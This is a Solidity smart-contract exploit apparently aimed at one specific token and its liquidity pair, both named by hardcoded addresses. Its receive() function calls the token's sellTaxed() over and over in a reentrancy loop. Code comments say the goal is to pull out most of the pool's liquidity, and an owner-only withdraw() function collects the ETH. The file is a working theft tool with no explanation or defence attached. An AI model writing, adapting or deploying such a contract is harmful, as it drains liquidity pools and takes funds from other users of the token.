// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IToken {
    function sellTaxed() external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
}

contract Zoom {

    address public token = 0x24e0a95040A2c7E6B65E2D339b08c8e030595f81;
    address public pair = 0x8E8D8426c0bd9E74A59C3e8CDa1ea18b80AA1094;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // You want the amount to be as low as possible so that most of the LP is withdrawn. But if it's too low the transaction loops too many times.
    uint public amount; // Make it 5% of current ETH in LP

    address public owner;

    constructor () {
      owner = msg.sender;
    }

    receive() external payable {
      if(IERC20(WETH).balanceOf(pair) >= amount) {
        IToken(token).sellTaxed();
      }
    }

    function normal() public {
      IToken(token).sellTaxed();
    }

    function horn(uint _amount) public {
      amount = _amount;
      IToken(token).sellTaxed();
    }

    function withdraw() public {
      require(msg.sender == owner);
      (bool sent, ) = msg.sender.call{value: address(this).balance}("");
      require(sent, "Failed to send Ether");
    }


}
